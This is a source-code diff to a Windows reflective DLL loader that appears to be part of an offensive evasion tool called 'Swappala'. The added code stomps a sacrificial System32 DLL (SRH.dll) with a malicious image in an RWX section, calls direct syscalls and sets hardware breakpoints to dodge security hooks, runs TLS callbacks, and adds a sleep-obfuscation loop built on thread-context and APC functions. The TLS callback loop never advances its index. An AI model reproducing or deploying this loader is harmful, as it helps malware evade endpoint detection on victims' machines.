@@ -1,8 +1,18 @@
 ﻿#include "pch.h"
 #include "headers.h"
-#include "syscalls.h"
 #include "misc.h"
 #include "hwbp.h"
+#include "syscalls.h"
+#include "sleaping.h"
+
+typedef struct _SAC_DLL_HEADER
+{
+	HANDLE sac_dll_handle;
+	HANDLE mal_dll_handle;
+	SIZE_T payload_size;
+	PBYTE to_free;
+
+} SAC_DLL_HEADER, *PSAC_DLL_HEADER;
 
 EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 {
@@ -19,9 +29,9 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
 	PIMAGE_BASE_RELOCATION img_reloc = NULL;
 	PBASE_RELOCATION_ENTRY reloc_entry = NULL;
-	PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFunctionEntry = NULL;
-	PIMAGE_TLS_DIRECTORY pImgTlsDirectory = NULL;
-	PIMAGE_TLS_CALLBACK* arrayOfCallbacks = NULL;
+	PIMAGE_RUNTIME_FUNCTION_ENTRY img_runtime_func_entry = NULL;
+	PIMAGE_TLS_DIRECTORY img_tls_dict = NULL;
+	PIMAGE_TLS_CALLBACK* tls_callbacks = NULL;
 
 
 
@@ -36,7 +46,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	int entries_count;
 
 	//fix Memory Protection variables
-	DWORD dwProtection = 0x00;
+	DWORD section_protection = 0x00;
 
 
 	//locate DLL in memory
@@ -149,8 +159,8 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	PBYTE sac_dll_base = NULL;
 	CHAR sac_dll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };
 
-	HMODULE sac_dll_module = NULL;
-	sac_dll_module = func_LoadLibraryExA(sac_dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
+	HMODULE sac_dll_module_by_LoadLibrary = NULL;
+	sac_dll_module_by_LoadLibrary = func_LoadLibraryExA(sac_dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
 
 	unset_hwbp(DrIndex::DR1);
 	unset_hwbp(DrIndex::DR2);
@@ -158,7 +168,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 
 	func_RemoveVectoredExceptionHandler((PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
 
-	sac_dll_base = (PBYTE)sac_dll_module;
+	sac_dll_base = (PBYTE)sac_dll_module_by_LoadLibrary;
 
 	/* parse sacrificial dll to retrieve the size */
 	PIMAGE_DOS_HEADER sac_dll_img_dos_hdr_ptr = NULL;
@@ -181,6 +191,8 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 		return NULL;
 
 	sac_dll_mem_addr_for_syscall = (PVOID)(sac_dll_base);
+
+	// OptionalHeader.SizeOfImage records the memory size occupied by the loaded dll in memory.
 	sac_dll_payload_size_for_syscall = (SIZE_T)sac_dll_img_nt_hdr_ptr->OptionalHeader.SizeOfImage;
 
 
@@ -188,14 +200,17 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 
 	PVOID sac_dll = NULL;
 	HANDLE dll_file = NULL;
-	HANDLE section_handle = NULL;
+	HANDLE new_section_handle = NULL;
 	SIZE_T view_size = NULL;
 
 	sac_dll_payload_size_for_syscall = sac_dll_payload_size_for_syscall + 24;
+
+	// size of sacrifical dll( SRH.dll) + 24
 	LARGE_INTEGER section_size = { sac_dll_payload_size_for_syscall };
 
+	// create new section, which size is the size of sacrifical dll( SRH.dll) plus 24
 	if (status = ZwCreateSection(
-		&section_handle,
+		&new_section_handle,
 		SECTION_ALL_ACCESS,
 		NULL,
 		&section_size,
@@ -210,21 +225,22 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	// unmap the view of section of the SRH.dll mapped by LoadLibraryExA()
 	if (status = ZwUnmapViewOfSection(
 		((HANDLE)(LONG_PTR)-1),
-		sac_dll_module,
+		sac_dll_module_by_LoadLibrary,
 		zw_func_s[ZwUnmapViewOfSectionF].SSN,
 		zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
 	) != 0)
 		return FALSE;
 
-	sac_dll = (PVOID)sac_dll_module;
+	// re-map the dll to first loaded address.
+	sac_dll = (PVOID)sac_dll_module_by_LoadLibrary;
 	if (status = ZwMapViewOfSection(
-		section_handle,
+		new_section_handle,
 		((HANDLE)(LONG_PTR)-1),
-		&sac_dll,
+		&sac_dll,			// anticipated address
 		NULL,
 		NULL,
 		NULL,
-		&sac_dll_payload_size_for_syscall,
+		&sac_dll_payload_size_for_syscall, // mapped size
 		ViewUnmap,
 		NULL,
 		PAGE_EXECUTE_READWRITE,
@@ -234,18 +250,21 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 		return FALSE;
 
 	// fixing the base address including the 16 bytes of header.
+	// skip the custom header
 	reflective_dll_base = reflective_dll_base + (16);
 
 	pebase = (PBYTE)sac_dll;
 	custom_memcpy_classic(pebase, &sac_dll_handle, sizeof(HANDLE));
 	pebase += sizeof(HANDLE);
-	custom_memcpy_classic(pebase, &section_handle, sizeof(HANDLE));
+	custom_memcpy_classic(pebase, &new_section_handle, sizeof(HANDLE));
 	pebase += sizeof(HANDLE);
 	custom_memcpy_classic(pebase, &sac_dll_payload_size_for_syscall, sizeof(SIZE_T));
-	pebase += sizeof(HANDLE);
+	pebase += sizeof(SIZE_T);
 	custom_memcpy_classic(pebase, &mem_to_free, sizeof(PBYTE));
 	pebase += sizeof(PBYTE);
 
+
+	// allocate memory to record the current pe section header pointers
 	PVOID pe_section_temp = NULL;
 	SIZE_T s_size = 0x0;
 	s_size = sizeof(PIMAGE_SECTION_HEADER) * img_file_hdr.NumberOfSections;
@@ -261,8 +280,6 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 		zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
 	)) != 0)
 		return FALSE;
-
-	
 
 	pe_sections = (PIMAGE_SECTION_HEADER*)pe_section_temp;
 
@@ -353,25 +370,132 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 				WORD* to_adjust = (WORD*)(pebase + img_reloc->VirtualAddress + reloc_entry->Offset);
 				*to_adjust += HIWORD(delta);
 			}
-			
+			break;
+			case IMAGE_REL_BASED_LOW:
+			{
+				WORD* to_adjust = (WORD*)(pebase + img_reloc->VirtualAddress + reloc_entry->Offset);
+				*to_adjust += LOWORD(delta);
+			}
+			break;
+			case IMAGE_REL_BASED_ABSOLUTE:
+				break;
 
 			default:
 				break;
 			}
 		}
 
+		img_reloc = (PIMAGE_BASE_RELOCATION)(reinterpret_cast<DWORD_PTR>(img_reloc) + img_reloc->SizeOfBlock);
 
 	}
 
 
 
+	/* Adjust memory protections basing on section headers. */
+	PVOID mem_addr_for_syscall = NULL;
+	SIZE_T payload_size_for_syscall = NULL;
+	ULONG u_old_protection = NULL;
+
+	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
+	{
+		// write
+		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
+		{
+			section_protection = PAGE_WRITECOPY;
+		}
+
+		//read
+		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_READ)
+		{
+			section_protection = PAGE_READONLY;
+		}
+
+		// execute
+		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE)
+		{
+			section_protection = PAGE_EXECUTE;
+		}
+
+		// read and  write
+		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_READ
+			&& pe_sections[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
+		{
+			section_protection = PAGE_READWRITE;
+		}
+
+		// execute and write
+		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE
+			&& pe_sections[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
+		{
+			section_protection = PAGE_EXECUTE_WRITECOPY;
+		}
+		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_READ
+			&& pe_sections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE)
+		{
+			section_protection = PAGE_EXECUTE_READ;
+		}
+		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_READ
+			&& pe_sections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE
+			&& pe_sections[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
+		{
+			section_protection = PAGE_EXECUTE_READWRITE;
+		}
+
+		mem_addr_for_syscall = (PVOID)(pebase + pe_sections[i]->VirtualAddress);
+		payload_size_for_syscall = (SIZE_T)pe_sections[i]->SizeOfRawData;
+
+		if ((status = ZwProtectVirtualMemory(
+			((HANDLE)(LONG_PTR)-1),
+			&mem_addr_for_syscall,
+			&payload_size_for_syscall,
+			section_protection,
+			&u_old_protection,
+			zw_func_s[ZwProtectVirtualMemoryF].SSN,
+			zw_func_s[ZwProtectVirtualMemoryF].sysretAddr
+		)) != 0)
+			return FALSE;
+
+	}
+
+	/* Register Exceptions handlers */
+	if (img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size)
+	{
+		img_runtime_func_entry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pebase + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
+		if (!func_RtlAddFunctionTable(
+			img_runtime_func_entry,
+			(img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(PIMAGE_RUNTIME_FUNCTION_ENTRY)),
+			(DWORD64)pebase))
+		{
+			; // do nothing
+		}
+	}
+
+	/* Execute TLS callbacks */
+	if (img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size)
+	{
+		img_tls_dict = (PIMAGE_TLS_DIRECTORY)(pebase + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
+		tls_callbacks = (PIMAGE_TLS_CALLBACK*)(img_tls_dict->AddressOfCallBacks);
+
+		int i = 0;
+		while (tls_callbacks[i] != NULL)
+		{
+			tls_callbacks[i]((LPVOID)pebase, DLL_PROCESS_ATTACH, NULL);
+		}
+
+	}
 
 
+	/* Flushing Instruction Cache Alla Fewer */
+	if ((status = ZwFlushInstructionCache(
+		(HANDLE)-1,
+		NULL, 0x00,
+		zw_func_s[ZwFlushInstructionCacheF].SSN,
+		zw_func_s[ZwFlushInstructionCacheF].sysretAddr)) != 0)
+	{
+		return FALSE;
+	}
 
-
-
-	
-
+	return pebase;
 
 }
 
@@ -467,6 +591,78 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 
 }
 
+bool init_func_addr(PFUNCTION_ADDRESSES func_addr)
+{
+	// handle to ntdll and user32
+	HMODULE hm_ntdll = { 0 };
+	HMODULE hm_user32 = { 0 };
+	HMODULE hm_kernel32 = { 0 };
+	if (!(hm_ntdll = GetModuleHandleA("ntdll"))) {
+		return false;
+	}
+	if (!(hm_user32 = GetModuleHandleA("user32.dll"))) {
+		return false;
+	}
+	if (!(hm_kernel32 = GetModuleHandleA("kernel32.dll"))) {
+		return false;
+	}
+	// function pointers for thread contexts
+	func_addr->NtTestAlertAddress = GetProcAddress(hm_ntdll, "NtTestAlert");
+	func_addr->NtWaitForSingleObjectAddress = GetProcAddress(hm_ntdll, "NtWaitForSingleObject");
+	func_addr->MessageBoxAddress = GetProcAddress(hm_user32, "MessageBoxA");
+	func_addr->ResumeThreadAddress = GetProcAddress(hm_kernel32, "ResumeThread");
+
+	if (func_addr->NtTestAlertAddress == NULL 
+		|| func_addr->NtWaitForSingleObjectAddress == NULL 
+		|| func_addr->MessageBoxAddress == NULL 
+		|| func_addr->ResumeThreadAddress == NULL
+		) 
+	{
+		return false;
+	}
+
+
+	return true;
+}
+
+
+bool init_nt_func_s(PNT_FUNCTIONS nt_func_s)
+{
+
+	// Load the ntdll.dll library
+	HMODULE hm_ntdll = GetModuleHandleA("ntdll.dll");
+	if (hm_ntdll == NULL)
+	{
+
+		return false;
+	}
+
+	nt_func_s->NtWaitForSingleObject = (NtWaitForSingleObjectFunc)GetProcAddress(hm_ntdll, "NtWaitForSingleObject");//
+	nt_func_s->NtQueueApcThread = (NtQueueApcThreadFunc)GetProcAddress(hm_ntdll, "NtQueueApcThread");//
+	nt_func_s->NtGetContextThread = (NtGetContextThreadFunc)GetProcAddress(hm_ntdll, "NtGetContextThread");//
+	nt_func_s->NtSetContextThread = (NtSetContextThreadFunc)GetProcAddress(hm_ntdll, "NtSetContextThread");//
+	nt_func_s->NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddress(hm_ntdll, "NtCreateThreadEx"); // Added
+	nt_func_s->NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hm_ntdll, "NtCreateEvent");
+	nt_func_s->NtResumeThread = (NtResumeThreadFunc)GetProcAddress(hm_ntdll, "NtResumeThread");//
+	nt_func_s->NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(hm_ntdll, "NtQuerySystemInformation");
+	nt_func_s->NtQueryObject = (NtQueryObjectFunc)GetProcAddress(hm_ntdll, "NtQueryObject");
+	nt_func_s->NtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactoryFunc)GetProcAddress(hm_ntdll, "NtQueryInformationWorkerFactory");
+
+
+	// Check if all function addresses were retrieved successfully
+	if (!nt_func_s->NtResumeThread || !nt_func_s->NtWaitForSingleObject || !nt_func_s->NtQueueApcThread ||
+		!nt_func_s->NtGetContextThread || !nt_func_s->NtSetContextThread || !nt_func_s->NtCreateThreadEx || !nt_func_s->NtCreateEvent
+		|| !nt_func_s->NtQueryInformationWorkerFactory || !nt_func_s->NtQueryObject || !nt_func_s->NtQuerySystemInformation) // Modified
+	{
+
+		return false;
+	}
+
+	return true;
+
+}
+
+
 BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
 	LPVOID lpReserved
@@ -476,17 +672,59 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	{
 	case DLL_PROCESS_ATTACH:
 	{
-		PBYTE old_memory = NULL;
+		PSAC_DLL_HEADER sac_dll_header = NULL;
 
 		// even if unmapped it's in the PEB
-		PBYTE self_base = (PBYTE)GetModuleHandleA("SRH.dll");
+		PBYTE sac_dll_base = (PBYTE)GetModuleHandleA("SRH.dll");
+		if (sac_dll_base == NULL)
+			return FALSE;
+
+		sac_dll_header = (PSAC_DLL_HEADER)sac_dll_base;
 
 		// retrieve the information left from the reflective loader
-		PHANDLE p_handle = (PHANDLE)self_base;
-		HANDLE sac_dll = *p_handle;
+		HANDLE sac_dll_handle = sac_dll_header->sac_dll_handle;
+		// retrieve handle of malware dll
+		HANDLE mal_dll_handle = sac_dll_header->mal_dll_handle;
+		SIZE_T sac_dll_size = sac_dll_header->payload_size;
 
+		PBYTE old_memory = (PBYTE)sac_dll_header->to_free;
 
+		sac_dll_base = (PBYTE)(sac_dll_header + 1);
 
+		// remove the very first buffer allocated for the reflective dll
+		if (VirtualFree(old_memory, 0, MEM_RELEASE) == 0)
+		{
+			// error releasing old buffer
+			return FALSE;
+		}
+
+		// initialize all the NtFunctions
+		NT_FUNCTIONS nt_func_s = { 0 };
+		if (!init_nt_func_s(&nt_func_s))
+		{
+			return FALSE;
+		}
+
+		HMODULE hm_ntdll = { 0 };
+		if (!(hm_ntdll = GetModuleHandleA("ntdll.dll")))
+			return FALSE;
+
+		PVOID NtTestAlert_addr = GetProcAddress(hm_ntdll, "NtTestAlert");
+		if (NtTestAlert_addr == NULL)
+			return FALSE;
+
+		do
+		{
+			MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
+			if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_func_s, NtTestAlert_addr) == -1)
+			{
+				MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
+				return FALSE;
+			}
+
+		} while (true);
+
+		return TRUE;
 	}
 
 	case DLL_THREAD_ATTACH:
